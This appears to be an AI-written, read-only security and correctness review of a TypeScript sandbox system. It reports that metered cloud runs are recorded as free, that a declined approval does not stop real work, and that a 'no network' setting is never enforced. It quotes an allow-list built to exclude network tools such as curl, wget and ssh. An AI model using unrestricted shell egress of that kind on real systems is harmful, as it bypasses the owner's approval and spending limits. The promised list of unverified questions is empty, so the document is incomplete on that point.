# Checkpoint review of the workshop chain (read-only, 2026-09-06)

Reviewed at the campaign tip `168ee901` by the independent architect, per the owner's directive that the tranche steward reviews the workshop chain at checkpoint. Read-only: nothing in the chain was edited. Method: four adversarial readers (authority and consequence; rehearsal versus reality; the acquisition door and credentials; doctrine versus code and tests) produced twenty findings; the six most severe were each handed to a refuter told to default to refuted, and every one of the six was reproduced rather than refuted. The fourteen unverified findings are listed at the end as questions, not claims.

## Confirmed (reproduced by the refuter)

### [high] Metered substrates report zero cost, so the per-workshop budget and the owner's monthly ceiling never move and stop nothing
`src/services/workshop/fly-sprites.ts:203` — dimension: authority-and-consequence

**Scenario.** Owner approves the Sprites card; decideAcquisition writes workshop_spend_ceiling (acquisition.ts:244-248); SPRITES_TOKEN is set. Every daily schema_description_tick (and any other caller of createWorkshop) creates a sprite and runs steps in the owner's account. flySpritesWorkshop.create/run/destroy each return costCents: 0, so workspaces.spent_cents stays 0 for the life of every real workshop. The pre-create check at index.ts:132-137 (SUM(spent_cents) >= cents_per_month) can never be true, and the per-workshop check at index.ts:230 (spentCents >= budgetCents) can never trip. A runaway responsibility making a thousand workshops passes the ceiling every time. The card the owner decided on said 'At most $0.25, because that is the ceiling I already stop at on each piece of work' (carrying.ts:709-713) — on the only substrate this card is for, nothing ever stops. Same for fly_machines (fly-machines.ts:94,105,109,113,117,121): a launched machine bills per second and is recorded as free. Secondary: index.ts:135 sums only workspaces created this month, so a workshop opened on the 31st and still alive is outside next month's ceiling.

**Why it stands.** The claim stands, and I reproduced it concretely rather than by reading alone.

WHAT THE CODE DOES. The only writers of workspaces.spent_cents are /home/user/foundry/src/services/workshop/index.ts:41-43 (event(), from the substrate's costCents), :236 (run, result.costCents) and :286-289 (destroy, done.costCents). Both metered substrates return 0 on every method: /home/user/foundry/src/services/workshop/fly-sprites.ts:168 (create), :178/:193/:202 (run), :222 (sleep), :227 (wake), :237 (destroy); /home/user/foundry/src/services/workshop/fly-machines.ts:94, :105, :109, :113, :117, :121. So the monthly check at index.ts:127-144 (`SUM(spent_cents) >= cents_per_month`) and the per-workshop check at index.ts:230 (`spentCents >= budgetCents`) can never be true for a real workshop on either substrate. Nothing reads usage or billing from the provider anywhere (grep across src: no other spent_cents writer; workshop-standing.ts only does the authenticated list).

REPRODUCED. Script /tmp/claude-0/-home-user-foundry/5ce3cc35-da78-5173-8934-f21127289e4d/scratchpad/ceiling-demo.mts (in-memory DB, same setup as tests/unit/a-yes-that-leads-somewhere.test.ts): produceSchemaDescription(real) hits the no-token wall on fly_sprites and raises the ask; decideAcquisition(approved) writes workshop_spend_ceiling = 500; SPRITES_TOKEN set and fetch mocked to answer 200 and echo the file. Twenty-five real pieces of work then ran: 25 sprites created (25 PUT), 50 execs, 25 deletes, all 25 artifacts verified. Ledger afterwards: SUM(spent_cents)=0, SUM(budget_cents)=650; workspace_events created/ran/destroyed all at cost 0; the ceiling never refused anything. The card he approved says "I stop at $5.00 a month of metered use above the plan — twenty pieces of work at the ceiling above ... this is the number that makes that true rather than a promise" (/home/user/foundry/src/services/institution/carrying.ts:718-722) and "At most $0.25, because that is the ceiling I already stop at on each piece of work" (carrying.ts:711-713). On the only substrate that card is for, neither number stops anything. index.ts:113-126 asserts the check stops "a responsibility that had gone wrong from making a thousand of them"; it does not.

WHY THE TESTS DID NOT CATCH IT. a-yes-that-leads-somewhere.test.ts:86-94 proves the ceiling by INSERTing spent_cents=900 directly on local_process, so no metered substrate's accounting is exercised; computers-are-workshops-not-authorities.test.ts:102-109 proves "stops when the budget is spent" on reference_world, whose run() returns costCents: 1 (reference.ts:52-61). That is a rehearsal proving a bound the real substrate cannot trip — the institution's own rule at carrying.ts:660 ("a limit nothing checks is a sentence, not a limit") applied to itself. The chain already has the precedent for the honest alternative: local-process.ts:244-254 prices steps by wall-clock at a stated rate "because it is the only honest one available for a host we do not bill for". fly_sprites neither estimates nor says it cannot.

Doctrine: the approval named an act with a money bound ($5/month metered, $0.25 per piece); the mechanism that was said to honour it is blind, so the owner's money is bounded by nothing but the vendor's included allowance, which the adapter cannot see. That is a decision card telling him something the institution cannot make true.

Secondary points from the claim: (a) index.ts:135 summing by created_at month is a real imprecision but only once costs are nonzero, and produceSchemaDescription tears down in `finally` (carrying.ts:891-895), so I cannot demonstrate a wrong outcome from it today. (b) Observed in the run but outside the claim: index.ts:147-159 INSERTs the workspaces row before sub.create(), so the daily no-token tick leaves one undestroyed row with external_ref NULL per day (26 rows for 25 creates).

**Smallest fix proposed.** Smallest fix that makes the owner's number true without inventing a rate: charge the monthly ceiling by reservation, not by what an unmetering substrate reports. In /home/user/foundry/src/services/workshop/index.ts:132-136 change the sum to `SELECT COALESCE(SUM(MAX(spent_cents, budget_cents)), 0) AS n FROM workspaces WHERE founder_id = ? AND evidence_mode = 'real' AND datetime(created_at) >= datetime('now','start of month')`. Every real workshop then counts at least its own budget (25 cents for a schema description), so the card's "twenty pieces of work at the ceiling above" becomes literally what refuses the twenty-first; a substrate that later meters for real reports more and is counted at more. Add a one-line comment at fly-sprites.ts:168 and fly-machines.ts:94 stating that cost is not metered by this adapter and the workspace's budget is the reservation that governs it. Add a test beside a-yes-that-leads-somewhere.test.ts that mocks fetch to 200, sets SPRITES_TOKEN, calls produceSchemaDescription(real) 21 times and expects the 21st to return workspaceId null with /reached the ceiling you set/. (Follow-up, not the smallest fix: give fly_sprites a stated wall-clock estimate like local-process.ts:251-254 so the per-workshop $0.25 bound at index.ts:230 also means something, and either move the workspaces INSERT after sub.create() or mark the row destroyed when create throws, so the no-token tick stops accumulating orphan rows.)

### [high] The acquisition decision is not the gate on using the workshop — the environment variable is; a declined or unanswered card still lets real work run in the owner's account with no ceiling
`src/services/institution/carrying.ts:558` — dimension: authority-and-consequence

**Scenario.** Owner is shown the run_in_workspace card and answers 'not yet' (decideAcquisition sets decision='declined' and returns at acquisition.ts:217 — no maturity change, no ceiling written), or has not answered at all. SPRITES_TOKEN is nevertheless present in the deployment (he set it while looking at the provider, or an operator copied secrets). Next 06:20 tick: chooseAWorkspace excludes only maturity 'unavailable' (which only withdrawAcquisition sets, acquisition.ts:281-287); cp_run_in_sprite is 'declared' (migration 271:71-72) and 'can run a step' is 'yes' (migration 272:15), 'isolated' may_produce=1 (migration 267:38) — so fly_sprites is chosen. createWorkshop finds no workshop_spend_ceiling row and skips the check entirely (index.ts:131 'When no ceiling has been authorised there is nothing to check'). A sprite is created and exec'd in the owner's account, metered against his plan, while workshopStanding tells him 'You said not yet, so I am leaving it. The work it was for stays undone rather than being done somewhere unsafe.' (workshop-standing.ts:77-79). Nothing in the chain from chooseAWorkspace to flySpritesWorkshop.create reads capability_acquisitions.decision. Constitution 'Acquiring a capability is an act, and it has a door': 'nothing is acquired that was not approved'.

**Why it stands.** CONFIRMED by reading and by an in-memory reproduction (scratch file DB, globalThis.fetch stubbed, nothing in the repo touched; production runs `node dist/index.js` so no tsx artefact applies).

The use path never reads the decision. From the daily job (src/jobs/index.ts:2927-2966, which calls produceSchemaDescription({evidenceMode:'real'}) unconditionally on drift) through produceSchemaDescription (src/services/institution/carrying.ts:813-867) -> chooseAWorkspace (carrying.ts:551-599) -> createWorkshop (src/services/workshop/index.ts:64-160) -> flySpritesWorkshop.create (src/services/workshop/fly-sprites.ts:141-170), the only reads of capability_acquisitions anywhere in src are askForTheComputer's "already answered" guard (carrying.ts:753-758, which only suppresses a second card), workshop-standing.ts (display), and the foundry-shell routes. Verified by grep: nothing on the path consults decision, decided_by or withdrawn_at.

The three gates that exist do not hold: (1) carrying.ts:556-558 filters providers only by `maturity <> 'unavailable'`, and 'unavailable' is set solely by withdrawAcquisition (acquisition.ts:281-287) after an approval; decideAcquisition('declined') returns at acquisition.ts:217 leaving cp_run_in_sprite at 'declared' (seeded migration 271:68-72), which chooseAWorkspace deliberately accepts for real work (comment at carrying.ts:561-575). fly_sprites is 'isolated' (migration 246:93) with may_produce=1 (migration 267:38) and 'can run a step' = 'yes' (migration 272:87), so it is chosen. (2) index.ts:127-131: `if (ceiling)` — the monthly ceiling is only written by an approval (acquisition.ts:229-248), so a declined or unanswered card means no row and the check is skipped entirely; and since the sprites adapter reports costCents 0 for create/run/destroy (fly-sprites.ts:169, 202, 237), the per-workspace 25c budget never accrues either, so there is no ceiling of any kind. (3) fly-sprites.ts:62-66 token(): the presence of SPRITES_TOKEN in the deployment's env is the only thing standing before the PUT at fly-sprites.ts:163. No trigger on workspaces checks an acquisition (migration 244:60-72, 246:107-116).

Reproduction output (founder with the run_in_workspace card raised via proposeAcquisition with the same rows askForTheComputer writes, SPRITES_TOKEN set, fetch stubbed to 200):
  A. unanswered, workshopStanding = waiting_on_you -> produceSchemaDescription created workspace on fly_sprites (evidence_mode real, created_by institution:carrying) and the provider received PUT /sprites/foundry-self-development-…, POST …/exec {"command":"write docs/db/schema.snapshot.sql …"}, POST …/exec {"command":"read …"}, DELETE ….
  B. after decideAcquisition('declined'): workshopStanding = not_yet, says "You said not yet, so I am leaving it. The work it was for stays undone rather than being done somewhere unsafe." -> the very next produceSchemaDescription created a second real fly_sprites workspace and issued the same PUT/exec/exec/DELETE. workshop_spend_ceiling rows = 0, cp_run_in_sprite still 'declared', decision = 'declined'.

So metered work runs in the owner's paid account with no approval naming the act, no monthly ceiling, and the owner's screen asserting the opposite. This is the door in "Acquiring a capability is an act, and it has a door" (CONSTITUTION.md:409-431) enforced only on the `acquired_at` column (migration 245:76-78) — a column nothing on the use path reads — and violates "nothing may spend the owner's money without an approval that names the act". The unanswered case needs no unusual sequence: the shell page itself tells him to set SPRITES_TOKEN in the deployment secret store (foundry-shell.ts:3934-3937) and the 06:20 tick can land any time between his setting it and his tapping yes.

**Smallest fix proposed.** Tie use to the decision where workspaces are made, treating "no ceiling row" for an isolated (metered) substrate as a refusal rather than "nothing to check", and let that refusal raise the card the same way the credential one does.

src/services/workshop/index.ts, in the `if (input.evidenceMode === 'real')` block (currently lines 127-143), replace `if (ceiling) { ... }` with:

  if (!ceiling) {
    const iso = (await query(
      'SELECT isolation FROM workspace_substrates WHERE substrate = ?', [input.substrate]))
      .rows[0] as Record<string, unknown> | undefined;
    if (String(iso?.isolation) === 'isolated') {
      throw new WorkshopError(input.substrate, 'approval',
        `no decision of yours authorises metered work on ${input.substrate}, so nothing runs there`);
    }
  } else { /* existing month-to-date check unchanged */ }

The ceiling row is written only by an approval (acquisition.ts:229-248) and deleted on withdrawal (acquisition.ts:279), so its presence is exactly "approved and not withdrawn"; free substrates (local_process/reference_world) are untouched, preserving the comment's intent.

src/services/institution/carrying.ts:860, widen the card trigger so the work still raises the one decision when it hits this wall instead of the credential wall:
  if (real && err instanceof WorkshopError && (err.what === 'credential' || err.what === 'approval')) {

askForTheComputer already refuses to re-ask once answered (carrying.ts:753-759), so a declined card stays declined and the work stays undone, matching workshop-standing.ts:77-79. WorkshopError.what is an untyped string (contract.ts:48-52), so no contract change. One existing assertion will need updating: tests/unit/a-change-made-where-the-institution-is-not.test.ts:127 expects the real attempt's `because` to contain 'SPRITES_TOKEN'; it will now say the approval is missing. Add a test asserting that with SPRITES_TOKEN set and the card declined (and separately unanswered), produceSchemaDescription real returns workspaceId null and no fetch is made.

### [high] fly_sprites silently accepts network:'none' (applies no policy) and then hands the sprite an unrestricted shell — the record says no network, the computer has whatever egress the vendor gives
`src/services/workshop/fly-sprites.ts:149` — dimension: authority-and-consequence

**Scenario.** produceSchemaDescription creates every real workshop with network: 'none' (carrying.ts:843), and createWorkshop defaults to 'none' (index.ts:153,157). flySpritesWorkshop.create refuses only 'allowlist' — for the stated reason that 'a sprite would run with a policy nobody applied' — and for 'none' does a bare PUT with no body and no policy, so workspaces.network='none' is recorded while the sprite runs under the vendor default (the recorded evaluation, migration 268:32-35, says only that an allowlist CAN be enforced; nothing was read or applied about the default). run() then POSTs the step verbatim as a shell `command` (fly-sprites.ts:196-198) with no counterpart to local_process's MAY_RUN allow-list (local-process.ts:45-48, which exists precisely so 'curl, wget, ssh, git push, npm publish' are absent). The only check is the optional `use:` prefix (:176-177), which a step simply omits. So any step — today the institution's own `write …`/`read …` strings, tomorrow a generated change whose build runs `npm install`, `git push` or `curl` — reaches the world from a workshop the ledger says has no network, with no approval naming the act, and an audit of workspaces.network would say it could not have. Constitution: 'where a workshop runs is enforced, not described'; 'reach the world only through the institution's door'.

**Why it stands.** The claim stands. (1) Record vs. reality: src/services/workshop/index.ts:153 writes workspaces.network = input.network ?? 'none' and :157 passes it to the substrate; src/services/institution/carrying.ts:843 asks for network:'none' on every real change. contract.ts:23 has 'open' as a distinct value, so 'none' means "no egress", not "no policy asked for". (2) Nothing applies it: src/services/workshop/fly-sprites.ts:149-153 refuses only 'allowlist'; :163 is a bare PUT with no body and there is no other request in create(). Migration 272 records only that "the network allowlist refuse[s] rather than guess"; migration 268 'fly_sprites:network' records only that an allowlist is packet-enforced — neither says what an un-policied sprite does. (3) The vendor default is open, in the vendor's own words on the two pages migration 268 cites as sources (fetched read-only): "A Sprite starts permissive, so this is something you turn on rather than something you inherit" (fly.io/run-agent-code/) and "A Sprite's outbound network starts unrestricted; you narrow it by applying a DNS-based network policy from outside the Sprite" — and even the policy's default rule set "already covers the git hosts, package registries, and model APIs" (fly.io/learn/agent-sandbox/). (4) No enforcement at run time: fly-sprites.ts:176-181 checks only the optional 'use:' prefix and :191-198 posts the step verbatim as a shell `command` string; there is no counterpart to local-process.ts:45-48 MAY_RUN, :221-241 tokenise (no chaining/pipes) or :261 shell:false. (5) No structural backstop: the only constraint on network is the value CHECK at migration 244:46; no trigger ties it to substrate, and grep finds no reader of workspaces.network in src, so the false record is latent rather than displayed — but it is the ledger. (6) The adapter's own rationale at :144-147 ("A workspace whose policy could not be applied must not quietly run as though it had one") applies verbatim to 'none' and is not applied to it. Concrete scenario: owner approves the plan (b6e56916 flow) and SPRITES_TOKEN is set; the daily schema_description_tick (168ee901) calls produceSchemaDescription({evidenceMode:'real'}); chooseAWorkspace(true) picks fly_sprites (asserted at tests/unit/a-change-made-where-the-institution-is-not.test.ts:61); createWorkshop inserts network='none'; create() PUTs with no policy; the sprite exists with unrestricted egress; run() then posts whatever string it is handed to a shell with only an optional prefix between it and the world. Honest scope: today's only callers (carrying.ts:873,876) send 'write …'/'read …' strings, which are not network commands (and are not valid shell for this purpose either — a separate defect), so no step presently reaches the world; the demonstrable wrong outcome is a false 'none' on every real change workspace plus a boundary that is described, not enforced, on a substrate whose default is open. That is exactly the constitution's "where a workshop runs is enforced, not described" and the substrate requirement to "reach the world only through the institution's door". Tests do not cover it: a-computer-the-institution-is-not-on.test.ts creates with network:'none' and asserts success (PUT test and no-secret test), never that 'none' is honoured or refused.

**Smallest fix proposed.** Smallest fix, in src/services/workshop/fly-sprites.ts create(): check the credential first (call token(), as fly-machines.ts:81 does) so the owner's stop stays "no credential" and askForTheComputer at carrying.ts:859 still fires; then refuse every spec.network other than 'open' before any request, naming the vendor default: `token(); if (spec.network !== 'open') { throw new WorkshopError('fly_sprites', 'create', `network '${spec.network}' was asked for, but a sprite starts with unrestricted egress (vendor pages read 2026-09-05) and the endpoint that narrows it has not been read, so this sprite would be recorded as restricted and run unrestricted`); }`. Update tests/unit/a-computer-the-institution-is-not-on.test.ts: the "creates by name with a PUT" and "never puts a reusable secret inside the sandbox" cases to use network:'open' (or expect the refusal), and add a case asserting 'none' is refused with no fetch made. Record the vendor default as a substrate_evaluations finding in a new migration (e.g. 'fly_sprites:network_default', source fly.io/learn/agent-sandbox/). Real schema-description work then stops honestly at create until the policy endpoint is read and applied — the adapter's own "refuse rather than guess" rule. Follow-ups (not the smallest fix): run() needs MAY_RUN/tokenise parity or a policy applied before the first exec, and the 'write …'/'read …' step vocabulary is not shell and cannot be carried by this adapter as written.

### [high] A real Sprite run is recorded as free, so the owner's authorised spend ceiling and the per-workshop budget can never stop it
`src/services/workshop/fly-sprites.ts:202` — dimension: rehearsal-vs-reality

**Scenario.** Owner approves the run_in_workspace acquisition (which writes workshop_spend_ceiling, e.g. 100 cents/month) and sets SPRITES_TOKEN. The daily schema_description_tick (src/jobs/index.ts:2958) calls produceSchemaDescription({evidenceMode:'real'}), chooseAWorkspace(true) picks fly_sprites, and the adapter PUTs a real sprite, POSTs two execs and DELETEs it — all metered by the provider — while returning costCents 0 from create (line 168), run (line 202) and destroy (line 237). createWorkshop's ceiling check (src/services/workshop/index.ts:127-144) sums workspaces.spent_cents, which stays 0, so the check never trips; the 25-cent per-workshop budget (src/services/institution/carrying.ts:812) never trips; and the receipt read from the ledger (carrying.ts:898) says the real run cost 0. Verified with a stubbed fetch and a 1-cent ceiling: three real sprite lifecycles ran back to back, month-to-date real spend 0, every receipt 0. The record of a real metered run is identical to a rehearsal's zero-cost record, and the 'second grant' (a ceiling on metered use, commit b6e56916) is a sentence on a card.

**Why it stands.** Confirmed, not refuted. The path is real and the accounting is literally zero at every leg.

The scenario reaches fly_sprites: workspace_substrates seeds ('fly_sprites','isolated') (src/db/migrations/246_never_silently_absorbed.sql:93) and change_production_isolation has isolated->may_produce=1 (267:38), so mayProduceChanges is true; migration 272 sets fly_sprites 'can run a step' to 'yes — an adapter exists...' so canRunAStep is true (carrying.ts:502-506); cp_run_in_sprite is 'declared', which is not excluded (carrying.ts:556-559). So chooseAWorkspace(true) returns fly_sprites (carrying.ts:574-598) and schema_description_tick (src/jobs/index.ts:2958) calls produceSchemaDescription({evidenceMode:'real'}), which creates a workshop with network:'none' (passes the allowlist refusal at fly-sprites.ts:149) and runs two steps with no `use:` prefix (passes the grant check at fly-sprites.ts:176), then destroys.

The adapter charges nothing: src/services/workshop/fly-sprites.ts:168 `return { externalRef: name, costCents: 0 }`, :202 `costCents: 0` in run, :237 `return { costCents: 0 }` in destroy. Probe (npx tsx, VITEST=1 so safeFetch skips DNS, fetch stubbed to 200): {"create":0,"run":0,"destroy":0,"calls":["PUT .../v1/sprites/foundry-self-development-…","POST .../exec","DELETE .../sprites/…"]} — three metered provider calls, zero recorded.

Every bound is fed only by that number. src/services/workshop/index.ts:41-44 adds to workspaces.spent_cents only when costCents > 0; destroy adds done.costCents at :286-289. The per-workshop 25-cent budget (carrying.ts:812/844) is checked at index.ts:230 as `spentCents >= budgetCents`, and the trigger workspace:over_budget (244:82-83) fires only when spent_cents > budget_cents — neither can ever trip at 0. The monthly ceiling written by decideAcquisition (acquisition.ts:229-248) is checked at index.ts:127-143 by SUM(spent_cents) over real workspaces, so it can never trip either. The receipt at carrying.ts:902 reads that same ledger and reports 0.

The existing test for the ceiling (tests/unit/a-yes-that-leads-somewhere.test.ts:86-94) seeds spent_cents=900 by direct INSERT on a local_process row, so it never exercises what a real substrate reports; no test in the repo asserts fly_sprites costCents >= 1. No job or module reads billing/usage from the provider (grep for billing/usage/sprite in src/jobs and workshop services: none), so nothing reconciles later.

This contradicts what the institution itself recorded and promised: the contract says a workshop "accounts for what it cost" (contract.ts:7) and the constitution requires "account per workshop" (CONSTITUTION.md:386); local_process charges a stated wall-clock estimate precisely because "it is the only honest one available" (local-process.ts:244-254); migration 271:48-53 records Sprites as "billed hourly on actual usage, compute per second and only while a sprite is active"; migration 275:53-59 says expected overage is zero for THIS responsibility "and not a licence for whatever asks next, which is why a separate ceiling on metered spend exists rather than the plan standing in for one". With cost 0 that ceiling is unenforceable, and a real metered run is recorded as cheaper than a rehearsal (reference.ts charges 1 cent per step). Minor correction to the reviewer's wording only: the rehearsal record is not zero, it is 1 cent per step, which makes the inversion worse rather than refuting it.

**Smallest fix proposed.** Smallest fix, in src/services/workshop/fly-sprites.ts: meter the way local-process.ts:251-254 does, at the rate the institution already recorded. Add `const CENTS_PER_SECOND = 0.1;` (or a value derived from the 271 metering finding) and `function cost(startedAt: number): number { return Math.max(1, Math.round(((Date.now() - startedAt) / 1000) * CENTS_PER_SECOND)); }`; capture `const started = Date.now()` at the top of create, run and destroy and return `costCents: cost(started)` at lines 168, 202 and 237 (and on the refusal returns at 178/193 keep 0, since no request was made). The 1-cent floor is what makes the per-workshop budget and the monthly ceiling able to bind at all. Then add a hermetic test (stubbed fetch returning 200, SPRITES_TOKEN set, as in tests/unit/a-computer-the-institution-is-not-on.test.ts) asserting that flySpritesWorkshop.create/run/destroy each return costCents >= 1, and that after a real produceSchemaDescription against fly_sprites, workspaces.spent_cents > 0 and a second attempt under a 1-cent workshop_spend_ceiling is refused with /reached the ceiling you set/. If a truer figure is wanted later, destroy can recover the sprite's lifetime from the base-36 stamp already embedded in the name at spriteName() (line 96) and charge the whole active interval there.

### [high] workshopFor hands a real approved experiment to fly_machines by name, creating a billable machine nothing can run in and nothing tears down
`src/services/workshop/index.ts:382` — dimension: rehearsal-vs-reality

**Scenario.** Owner approves a real venture experiment via POST /foundry/venture/experiment (foundry-shell.ts:4390 → decideExperiment → workshopFor). workshopFor ignores whichComputersCouldWork/chooseAWorkspace — where fly_machines is recorded 'can run a step: no' (migration 268:54-57) and is not a run_in_workspace provider — and hard-codes substrate 'fly_machines' with budgetCents 0 and no `produces`. If the runtime carries FLY_API_TOKEN (the deploy token this environment already holds, per commit 79bbf1d0) and FLY_WORKSHOP_APP, flyMachinesWorkshop.create (fly-machines.ts:82-94) POSTs to api.machines.dev and a real shared-cpu machine is started for the owner's account with no approval naming the act; the row records 'created' at cost 0, write_code_in_branch and render_screen are granted into it, workshopFor returns opened:true, and the first run() throws 'not implemented' (fly-machines.ts:96-100). No caller destroys it. If the env vars are absent, the same call leaves a live evidence_mode='real' workspaces row with external_ref NULL (see next finding), and the WorkshopError is swallowed into `because` without raising an acquisition — so the experiment neither gets a computer nor puts a decision on his screen. Verified by mirroring the literal inputs with a stubbed fetch: one POST /v1/apps/foundry-workshops/machines, event 'created ... cost 0', grant ok, run threw, row still live.

**Why it stands.** Reproduced, not refuted. I ran a read-only in-memory probe (migrations + founder + real mandate/opportunity/unknown, then designExperiment(evidenceMode:'real') and decideExperiment(approved), exactly the path POST /foundry/venture/experiment takes at src/routes/dashboard/foundry-shell.ts:4390 → src/services/venture/validation.ts:179-180 → workshopFor). Two outcomes, both wrong under the doctrine named:

1. Production as configured (nothing in the repo, Dockerfile, fly.toml or .github/workflows/deploy-private.yml sets FLY_WORKSHOP_APP; src/index.ts:316 says only the deploy workflow holds FLY_API_TOKEN): decideExperiment returned {workshop:null}, and the DB held a live row `workspaces{substrate:'fly_machines', evidence_mode:'real', external_ref:null, destroyed_at:null, created_by:'experiment:…'}` with zero workspace_events and zero capability_acquisitions. createWorkshop (src/services/workshop/index.ts:147-160) inserts the row before sub.create, fly-machines.ts:36-42 throws, workshopFor:389-393 swallows it into `because`, and decideExperiment:180-181 discards `because`. So the function's own promise ("this says so rather than pretending", index.ts:361-364) reaches nobody, no decision is raised, and a workshop record exists for a computer that was never made — the exact state the chain's own test says must not happen (tests/unit/computers-are-workshops-not-authorities.test.ts:132-134, which asserts only the throw, not the absence of the row).

2. With FLY_API_TOKEN and FLY_WORKSHOP_APP set and fetch stubbed: exactly one `POST https://api.machines.dev/v1/apps/foundry-workshops/machines`, event `created … cost_cents 0` (the provider row at migrations/243:286 says 'per second of compute'), grants of write_code_in_branch and render_screen recorded, `run()` threw 'running a step in a real machine is not implemented' (fly-machines.ts:96-100), row still live with external_ref 'machine-123'. The only destroy caller in src is carrying.ts:894 (schema-description chain); nothing tears an experiment workshop down.

Root cause is index.ts:382 choosing the substrate by name. The institution already records that fly_machines cannot run a step (migrations/268:54-57), that run_in_workspace's only provider is fly_sprites (migrations/271:71), and chooseAWorkspace (src/services/institution/carrying.ts:547-600) exists precisely to choose by standing — workshopFor (written 2026-09-03, unchanged since) never consults it, so even after the owner approves the Sprites acquisition and sets SPRITES_TOKEN, an approved experiment still goes to fly_machines. No trigger or test blocks this: workspace_untrusted_code_needs_isolation (246:106-115) only refuses same_host, and no test asserts what a real experiment approval does to `workspaces`.

One correction to the claim's wording: "the deploy token this environment already holds" is the CI/session token, not shown to be in the running app's secrets, so the billable-machine branch is latent (requires an operator to set both vars) while the phantom-row/no-decision branch is the live behaviour today.

**Smallest fix proposed.** Smallest fix, in src/services/workshop/index.ts workshopFor (lines 376-388): for a real experiment, choose by standing instead of by name — `const choice = reference ? { substrate: 'reference_world', because: 'rehearsal' } : await (await import('../institution/carrying.js')).chooseAWorkspace(true); if (choice.substrate === null) return { opened: false, workshopId: null, because: choice.because };` before calling createWorkshop (so no row is inserted when nothing can carry it), then pass `substrate: choice.substrate` and `produces: 'a change to software'` to createWorkshop. Have decideExperiment (validation.ts:180-181) return `because` alongside `workshop` so the route can say it rather than drop it, and, as carrying.ts:823-825 already does, raise the run_in_workspace acquisition when the WorkshopError is `what === 'credential'` for real work (export askForTheComputer). Separately (the related row-left-behind finding): createWorkshop should call sub.create before inserting the workspaces row, or delete the row when create throws.

### [high] createWorkshop writes the workspaces row before the substrate exists, so every refused create leaves a live 'real' workshop row that points at nothing
`src/services/workshop/index.ts:147` — dimension: rehearsal-vs-reality

**Scenario.** The INSERT INTO workspaces (lines 147-154) runs before substrate.create (line 156). When the adapter refuses — no SPRITES_TOKEN, no FLY_API_TOKEN, allowlist not readable, or an HTTP error — the exception propagates and the row stays: destroyed_at NULL (so it matches idx_workspaces_live), external_ref NULL, evidence_mode 'real', no 'created' event. On the live path this happens once per day: schema_description_tick (jobs/index.ts:2958, schedule '20 6 * * *') calls produceSchemaDescription(real) whenever the snapshot has drifted and the owner has not yet set a credential, so the record accumulates a fresh real self_development workshop on fly_sprites every morning that never existed. No job or function ever cleans them (nothing in src/jobs touches workspaces). The test that covers this path (tests/unit/computers-are-workshops-not-authorities.test.ts:131-137) asserts in prose that 'the workspace row is refused rather than left behind' but only checks the throw. Verified: after produceSchemaDescription(real) without a token, `SELECT ... FROM workspaces` returned a row `{ substrate: 'fly_sprites', evidence_mode: 'real', external_ref: null, destroyed_at: null, created_by: 'institution:carrying' }` and workspace_events was empty.

**Why it stands.** The claim stands; I reproduced it end to end against a scratch libSQL database (migrations replayed, one founder inserted, SPRITES_TOKEN/SPRITE_TOKEN/FLY_API_TOKEN unset), touching nothing in the repository.

Code: /home/user/foundry/src/services/workshop/index.ts:146-160 inserts the workspaces row (147-154), then resolves the adapter (155) and calls sub.create (156-159), then UPDATEs external_ref (160). There is no try/catch, no compensating DELETE, and no transaction can span the external call. fly-sprites.ts:62-67 throws WorkshopError('fly_sprites','credential') from token() before any HTTP call, so the throw propagates out of createWorkshop with the row already committed. The workspaces triggers (migrations 244:61-90, 246:107-118) only guard INSERT/UPDATE; nothing deletes or closes a row whose external_ref never arrived, and no file in src/jobs references the workspaces table.

Live path: src/jobs/index.ts:2958 (schema_description_tick, '20 6 * * *') calls produceSchemaDescription({evidenceMode:'real'}) whenever carrySchemaDescription reports drift. carrying.ts:547-595 chooseAWorkspace deliberately no longer filters out 'declared' providers ("MATURITY IS EARNED BY THE FIRST ATTEMPT"), so it hands fly_sprites to createWorkshop (carrying.ts:832-840), which inserts the row and then fails in the adapter; carrying.ts:842-863 catches the error, raises the acquisition card, and returns workspaceId:null — leaving the row behind unmentioned.

Probe output (tsx, scratch file DB):
- chooseAWorkspace(true) -> substrate 'fly_sprites'.
- After the exact tested call at tests/unit/computers-are-workshops-not-authorities.test.ts:134-137 (fly_machines, reference, no token) rejected with /declared, not available/, workspaces held: { substrate:'fly_machines', evidence_mode:'reference', external_ref:null, destroyed_at:null, created_by:'foundry' }.
- After produceSchemaDescription(real) returned { workspaceId:null, substrate:'fly_sprites', because:'no SPRITES_TOKEN is configured...' }, workspaces additionally held: { substrate:'fly_sprites', evidence_mode:'real', purpose:'self_development', external_ref:null, destroyed_at:null, created_by:'institution:carrying' }; workspace_events was [] (no 'created' event).
- A second produceSchemaDescription(real) (the next morning) brought the live count (destroyed_at IS NULL) to 3.
- destroy({workshopId: orphan, preserved:'nothing'}) threw 'that workshop is gone' (index.ts:279), so the governed path can never close these rows: they are permanently live.

Doctrinal consequence: the record asserts a live, real, self_development workshop on fly_sprites made by institution:carrying that the provider never created — repository/record truth diverging from deployed truth ("a workspace existing is not work running in it"), accumulating one per drifted morning with no event trail and no way to retire it. The test comment at lines 132-133 claims "the workspace row is refused rather than left behind" but the test asserts only the rejection, which is why nothing caught it.

**Smallest fix proposed.** In /home/user/foundry/src/services/workshop/index.ts, keep the INSERT first (the INSERT triggers — unknown_substrate, untrusted_code_needs_isolation, ceiling_is_the_owners — must refuse before a real computer exists, otherwise a trigger refusal would orphan a sprite, the failure bdc83598 already fixed for the allowlist), but make the substrate failure take the row back with it:

  const id = nanoid();
  const sub = await substrate(input.substrate);   // moved above the INSERT: no side effects, and a missing adapter must not leave a row either
  await query(`INSERT INTO workspaces ...`, [...]);  // unchanged
  let made;
  try {
    made = await sub.create({ ... });               // unchanged args
  } catch (err) {
    // THE ROW IS REFUSED WITH THE COMPUTER. Nothing has been granted or recorded against it yet.
    await query('DELETE FROM workspaces WHERE id = ? AND external_ref IS NULL', [id]);
    throw err;
  }
  await query('UPDATE workspaces SET external_ref = ? WHERE id = ?', [made.externalRef, id]);

There is no BEFORE DELETE trigger on workspaces (verified across src/db/migrations), and no workspace_events or workspace_grants rows exist for the id at that point, so the DELETE is legal under the schema.

Then make the existing test check what its prose claims: in tests/unit/computers-are-workshops-not-authorities.test.ts after the rejected createWorkshop at lines 134-137, add
  expect(Number(((await query("SELECT COUNT(*) AS n FROM workspaces WHERE substrate = 'fly_machines'", [])).rows[0] as Record<string, unknown>).n)).toBe(0);
and, in tests/unit/a-change-made-where-the-institution-is-not.test.ts, assert the same zero-row outcome for produceSchemaDescription({evidenceMode:'real'}) with no SPRITES_TOKEN, so the daily path is covered.

## Refuted


## Not verified (questions for the steward, in severity order)

